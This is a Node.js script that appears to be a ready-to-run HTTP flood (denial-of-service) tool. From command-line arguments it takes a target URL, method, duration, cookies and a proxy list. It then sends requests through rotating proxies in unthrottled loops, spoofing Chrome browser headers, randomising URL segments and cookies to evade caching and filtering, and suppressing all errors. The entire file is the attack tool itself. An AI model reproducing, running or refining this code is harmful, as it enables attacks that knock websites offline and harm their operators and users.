// [URL] [METHOD] [TIME] [COOKIES] [PROXIES] [RANDCOOKIE(true - false)] [LENGTH]
const EventEmitter = require('events');
const requestM = require('request');
var jar = requestM.jar();
var request = requestM.defaults({jar: jar});
const fs = require('fs');
var RAND = 0
var TARGET = process.argv[2];
var index;
if(TARGET.includes("%RAND%")){RAND = 1; BROWSER = TARGET.replace("%RAND%", ""); index = TARGET.indexOf("%RAND%");}
var METHOD = process.argv[3];
var TIME = process.argv[4];
var LENGTH;
var COOKIES = process.argv[5].replace("\"", "");
const proxies = fs.readFileSync(process.argv[6], 'utf-8').match(/\S+/g);
var RANDCOOKIES = process.argv[7];
if (process.argv[8] === undefined){
    LENGTH = 1
}else{
    LENGTH = process.argv[8];
}
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });
const RandomString = (length=5)=>Math.random().toString(20).substr(2, length)
async function BrowserEngine(){
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);
    };
    function NORMAL(CC){
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        NormalRequest(TARGET, proxy, CC);
    }
    async function URL(CC){
        //TARGET = BROWSER+TARGET.substring(index, index+6) + "XXXXXX"
        TARGET = TARGET.replaceBetween(index, index+6, RandomString(LENGTH))
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        NormalRequest(TARGET, proxy, CC);
    }
    async function COOKIE(){
        //TARGET = BROWSER+TARGET.substring(index, index+6) + "XXXXXX"
        var CC = RandomString(LENGTH)
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        NormalRequest(TARGET, proxy, CC);
    }
    async function URL_COOKIE(){
        //TARGET = BROWSER+TARGET.substring(index, index+6) + "XXXXXX"
        TARGET = TARGET.replaceBetween(index, index+6, RandomString(LENGTH))
        var CC = RandomString(LENGTH)
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        NormalRequest(TARGET, proxy, CC);
    }

    if (RAND == 1 && RANDCOOKIES == "false"){
        setInterval(() => {
            URL(COOKIES);
        });
    }else if (RAND == 1 && RANDCOOKIES == "true"){
        setInterval(() => {
            URL_COOKIE();
        });
    }else if(RAND == 0 && RANDCOOKIES == "true"){
        setInterval(() => {
            COOKIE();
        });
    }else if(RAND == 0 && RANDCOOKIES == "false"){
        setInterval(() => {
            NORMAL(COOKIES);
        });
    }
    setTimeout(() => process.exit(0), TIME * 1000);
}
function NormalRequest(target, proxy, cookies){
    //console.log(cookies)
    request({
        url: target,
        method: METHOD,
        proxy: 'http://' + proxy,
        headers: {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,zh-CN;q=0.6,zh;q=0.5,de;q=0.4',
            'cache-control': 'max-age=0',
            'sec-ch-ua' : "Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99",
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': "1",
            'Connection': 'Keep-Alive',
            'cookie': cookies
        }
    });
}
async function wait(){
    await BrowserEngine();
}
wait()